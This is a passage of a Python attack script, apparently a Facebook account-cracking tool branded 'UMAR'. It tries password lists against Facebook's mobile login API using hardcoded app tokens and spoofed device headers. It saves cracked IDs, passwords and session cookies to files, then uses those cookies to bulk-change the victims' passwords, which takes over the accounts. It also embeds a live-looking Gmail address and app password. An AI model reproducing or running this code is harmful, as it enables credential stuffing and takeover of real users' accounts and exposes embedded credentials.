		try:
			global ok , cp , loop
			sys.stdout.write('\r [UMAR] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"device":"Samsung",
"sdk":"Android",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': R_Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/UMAR_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/UMAR_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/UMAR_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.r_crack(uid,pwx)
		except Exception as e:
			print(e)
class Join:
	def __init_(self):
		logo()
		os.system("xdg-open https://wa.me/+923021431324")
	def Whatsapp(self):
		os.system('xdg-open https://chat.whatsapp.com/KQaGgAfTTQOI3UtM3EyIKf')
		iAmMain().iAmMenu()
	def Facebook(self):
		os.system('xdg-open https://www.facebook.com/groups/1020338239226719/')
		iAmMain().iAmMenu()

class Grep:
	def __init__(self):
		logo()

	def remove_links(self):
		file = input(" [✓] File Path :- ")
		try:
			open(file,'r').read()
			print("	[✓]	Example  /sdcard/Umar.txt   ")
			out = input("  [=] Save Path :- ")
			os.system('touch '+out)
			os.system('sort -r '+file+' | uniq > '+out)
			p("  [ All double links are Removed ] ")
			p(" [•] Your File Saved in %s "%(out))
			input("  [ Press Enter To Go Back ] ")
			time.sleep(1)
			self.remove_links()
		except:
			p("  [ File Not Found ]  ");sp(1);self.remove_links()


	def links_only(self):
		os.system("rm -rf .tmp.txt")
		try:
			p(" [  Example  :-  /sdcard/file.txt  ] ")
			file = input(" [•|•] Enter File Path :- ")
			line()
			p("	Example  :-  /sdcard/Umar.txt   ")
			sav = input(" [✓] Enter Save Path :- ")
			line()
			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
			try:
				limit = int(input(" [•|•] how many links you wants to grep :- "))
				line()
			except:
				limit = 1
			t = open(file,"r").read().splitlines()
			xx = open(".tmp.txt","a")
			for x in t:
				uid = x.split("|")[0]
				xx.write(uid+'\n')
				xx.close()
			p("	  Example  :-  100089,88,87 etc")
			for n in range(limit):
				print(open(".tmp.txt","r").read().splitlines())
				digit = int(input(" [•|•] Enter Digit %s :- "%(n+1)))
				line()
				os.system('cat .tmp.txt | grep '+str(digit)+' >>'+sav+' ')
				p(" [	Your File Saved in :- %s ]  "%(sav))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.links_only()
		except Exception as e:
				print(" [^=^] Your File Not Found :( ")
				sp(2);self.links_only()


	def with_names(self):

		try:
			p("	Example  :-  /sdcard/file.txt	")
			line()
			file = input(" [✓] File Path :- ")
			line()
			p("	Example  :-  /sdcard/Umar.txt 	")
			ofile= input(" [✓] File Save Path :- ")
			line()
			try:
				p("	 Example :-  1 ,2,3,4,5 etc	")
				limit = int(input(" [=] How many Links with names you wanna grab :- "))
			except:
				limit = 2
			p("	Example  :-	100089 , 100088 etx  ")
			for n in range(limit):
				line()
				digit = int(input(" [•|•] Put Digits %s :- "%(n+1)))
				os.system('cat '+file+' | grep '+str(digit)+' >>'+ofile+' ')
				p(" [	Your File Saved in :- %s ]  "%(ofile))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.with_names()
		except:
			p("	[X] File Not Found ;(  ");sp(1);self.with_names()


class Server:
	def report(self):
		logo()
		print(" [•] Ex Cp issues/New updates Etc ")
		print(' [•] Please Describe issues in details\n [•] It will be send to Admin ')
		line()
		issue = input(' [•] Describe your Problem : ')
		name = input(' [•] Enter Your Name :- ')
		email = input(' [•] Enter Your Email/Contact/Fb Link : ')
		print(' [•] Sending Your Appeal .....')
		form = f'	__________________\n	Full Name : {name} \n	Email  : {email} \n	Issues : {issue} '
		TEXT = form
		SUBJECT = " Dilute Codes Users Feedback"
		message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
		se = "serverdilute@gmail.com"
		rse = "serverdilute@merry.pink"
		username = "serverdilute@gmail.com"
		password = "usqscwnpoyehoytc"
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.ehlo()
		server.starttls()
		server.login(username, password)
		server.sendmail(se, rse, message)
		print(" [•] Your Appleal Has been Submitted ")
		print(form)
		exit()

		
class automation:
	def __init__(self):
		self.url = "https://free.facebook.com"
	def menu(self):
		logo()
		
		p(" [1] Facebook Password Change Menu ")
		p(' [2] Cut Used File lines ')
		am = input(" [•] Select an option : ")
		if am == "1":self.iAmPasswordManager()
		elif am == "2":self.used_cutter()
		else:
			p(" [•] wrong select!! ");sp(2);self.menu()
	def used_cutter(self):
		clear()
		logo()
		lines=[]
		p(" [•] Ex : /sdcard/file.txt")
		try:
			file = input(" [•] Put File Path : ")
		except Exception as e:
			print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
		digit= int(input(" [•] Put Line Num :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		p(" [•] File Splitted Complete")
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : UMAR")
		line()
		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
		line()
		iamoption = input(' [•] Choose : ')
		if iamoption == '1':
			self.bulk_password()
		elif iamoption =='2':
			self.single_password()
		elif iamoption =='3':
			self.change_default()
		elif iamoption =='B':
			iAmApprovelSystem()
		else:
			p(" [•] Wrong Select ! ")
			sp(2);self.iAmPasswordManager()
	
	def bulk_password(self):
		sav = "/sdcard/dilute_passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "UMAR@@@"
		logo()
		p(" [•] Password Changer By : UMAR")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		try:
			file = input(" [•] Put File Path : ")
			id = open(file,"r").read().splitlines()
		except FileNotFoundError:
			print(" [•] File Not Found ! ")
			sp(2)
			self.bulk_password()
		logo()
		print(" [•] Password Changing Procces is started ! ")
		line()
		p(" [•] Total File Accounts : %s "%(len(id)))
		line()
		p(" [•] Please Be Patience Use Fast Internet ")
		line()
		for x in id:
			uid = x.split("|")[0]
			pw = x.split('|')[1]
			cok = x.split('|')[2]
			cookies = {"cookie":cok}
			
			try:
				r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
			except CE:
				p(" [•] Check Your Internet")
			except Exception as e:
				print(e)
			if "/zero/optin/write/?" in r:
				self.iAmFreeMode(cookies,r)
			try:
				r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
				r= r.replace("amp;","")
			except CE:
				print(" [•] Check Your Internet Unexpected Stopped ! ")
				exit()
			
			next = re.findall('action\="(.*?)"',r)[1]
			data = {
		"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
		"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
		"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
			po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
			po = po.replace("amp;","")
			if 'Password changed' in po:
				p(" [•]  \033[1;92m✓ Password Changed Succesfully : \033[1;97m%s "%(uid))
				open(sav,"a").write(uid+'|'+np+'\n')
			else:
				p(" [•]\033[1;91m Failed To Changed Password : \033[1;97m%s "%(uid))
		line()
		print(" [•] Proccess Has Been Completed ! ")
		print(" [•] Your File Saved in %s "%(sav))
		line()
		input(" [•] Press Enter To Go Back to Password Menu ! ")
		sp(1)
		self.iAmPasswordManager()
		
		
	def single_password(self):
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "UMAR"
		logo()
		p(" [•] Password Changer By : UMAR ")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		pw = input(" [•] Put Old Pass : ")
		cok = input(" [•] Paste Cookies : ")
		cookies = {'cookie':cok}
		try:
			r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
		except CE:
			p(" [•] Check Your Internet")
		except Exception as e:
			print(e)
		if "/zero/optin/write/?" in r:
			self.iAmFreeMode(cookies,r)
		r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
	"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
	"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
	"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
		po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
		
		po = po.replace("amp;","")
		if 'Password changed' in po:
			p(" [•]  ✓ Password Changed Succesfully ")
			
			sp(2)
			input(" [•] Press Enter To Go Backk")
			self.iAmPasswordManager()
		else:
			p(" [•] Failed To Changed Password ")
	def iAmFreeMode(self,cookies,r):
		for x in re.findall('action\=\"(.*?)"',r):
			if "/zero/optin/write/?" in x:
				next = x
		data ={}
		fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"',r).group(1)
		jazoest = re.search('name="jazoest" value="(.*?)"',r).group(1)
		data.update(
		{
		'fb_dtsg':fb_dtsg,
		'jazoest':jazoest,
		'submit':'Continue'
		}
		)
		po = requests.post('https://free.facebook.com'+str(x),cookies=cookies,data=data,allow_redirects=False)
	
	def change_default(self):
		logo()
		
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "UMAR786"
		p(" [•] Default Password : %s"%(iamdefaultpassword))
		line()
		os.system("rm -rf .default_password.txt ")
		change_pw = input(" [•] Put New Default Password : ")
		if len(change_pw) < 6:
			print(" [•] Password Should be Six Characters More .")
			sp(2)
			self.change_default()
		
		t = open(".default_password.txt","w").write(change_pw)
		print(" [•] Default Password is Changed ! ")
		p(" [•] Your New Password : %s "%(change_pw))
		line()
		input("[•] Press Enter to go back ")
	
		self.iAmPasswordManager()


if __name__=="__main__":
	#update()
	iAmMain().iAmMenu()
	#iAmMain().method4('100089112641726','vishnu singh',['Muhammad Siyal'])